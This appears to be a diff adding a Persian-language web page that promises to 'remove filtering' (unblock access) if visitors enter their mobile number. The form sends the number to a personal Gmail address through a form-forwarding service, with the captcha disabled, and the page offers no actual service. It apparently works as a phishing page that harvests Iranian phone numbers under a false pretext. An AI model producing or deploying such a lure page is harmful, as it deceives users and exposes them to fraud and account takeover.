@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>ارسال شماره</title>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Vazirmatn', sans-serif;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #333;
+    }
+    .container {
+      width: 90%;
+      max-width: 360px;
+      padding: 20px;
+      text-align: center;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+    input, button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+    input {
+      border: 1px solid #ccc;
+      text-align: center;
+    }
+    button {
+      background-color: #2e7de9;
+      border: none;
+      color: white;
+      cursor: pointer;
+    }
+    .error {
+      color: #d9534f;
+      font-size: 14px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="https://biaupload.com/do.php?imgf=org-014903b2af0c1.png" alt="لوگو">
+    <h2>شماره موبایل خود را جهت رفع فیلتری وارد نمایید</h2>
+
+    <form action="https://formsubmit.co/team.aqa.alireza@gmail.com" method="POST" onsubmit="return validateForm();">
+      <input type="tel" id="phone" name="phone" placeholder="09123456789" maxlength="11" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <div class="error" id="error">شماره موبایل معتبر نیست!</div>
+      <button type="submit">ادامه</button>
+    </form>
+  </div>
+
+  <script>
+    function validateForm() {
+      const phone = document.getElementById("phone").value;
+      const error = document.getElementById("error");
+      if (!/^09\d{9}$/.test(phone)) {
+        error.style.display = "block";
+        return false;
+      }
+      error.style.display = "none";
+      return true;
+    }
+  </script>
+</body>
+</html>
